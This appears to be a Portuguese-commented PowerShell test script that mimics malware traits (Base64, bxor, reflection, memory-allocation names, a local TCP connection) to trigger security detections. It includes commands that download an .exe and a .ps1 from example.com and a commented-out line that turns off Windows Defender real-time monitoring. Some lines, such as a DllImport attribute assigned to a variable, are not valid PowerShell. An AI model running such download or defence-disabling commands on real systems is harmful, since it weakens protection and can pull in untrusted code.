# Exemplo de script PowerShell que emula comportamentos suspeitos

# Base64 Encoding (exemplo simples)
$encodedString = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("Exemplo de texto codificado em Base64"))

# Assembly (exemplo simples)
Add-Type -AssemblyName System.Reflection

# Usando reflexão
$reflection = [Reflection.Assembly]::Load("System.Windows.Forms")

# Bxor (exemplo de operação bitwise)
$number = 0b1010 -bxor 0b1100

# Desabilitar monitoramento em tempo real (exemplo)
# Este é apenas um comando simulado; não execute em produção
# Set-MpPreference -DisableRealtimeMonitoring $true

# Exemplo de uma chamada que poderia usar o Get-MpPreference
$mpPref = Get-MpPreference

# UnsafeNativeMethods (simulação)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([IntPtr]::Zero, [System.Action])

# Chamada GetProcAddress (exemplo com DllImport)
function Get-ProcAddress {
    param (
        [string]$dllName,
        [string]$procName
    )
    # Código simulado; substitua por chamadas reais
    Write-Output "Chamada para GetProcAddress em $dllName para $procName"
}

Get-ProcAddress -dllName "kernel32.dll" -procName "CreateProcess"

# TCPClient (exemplo de conexão)
$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 8080)

# GetModuleHandle (exemplo simulado)
# Não executa em produção
$moduleHandle = [System.Diagnostics.Process]::GetCurrentProcess().Handle

# VirtualAlloc (exemplo simulado)
# Não execute em produção
$virtualAlloc = [Runtime.InteropServices.Marshal]::AllocHGlobal(100)

# WriteProcessMemory (exemplo simulado)
# Este é apenas um exemplo; não execute em produção
[Runtime.InteropServices.Marshal]::WriteByte($virtualAlloc, 0, 0x90) # NOP

# kernel32.dll (exemplo de chamada)
$kernel32 = [DllImport("kernel32.dll")]

# InMemoryModule (exemplo)
$memoryModule = "Módulo em Memória"

# Start-BitsTransfer (exemplo simulado)
Start-BitsTransfer -Source "http://example.com/file.exe" -Destination "C:\caminho\file.exe"

# Start-Process (exemplo)
Start-Process -FilePath "notepad.exe"

# Download (simulação de download)
Invoke-WebRequest -Uri "http://example.com/script.ps1" -OutFile "C:\caminho\script.ps1"

# Print de saída de alguns dados
Write-Output "Script executado com sucesso."
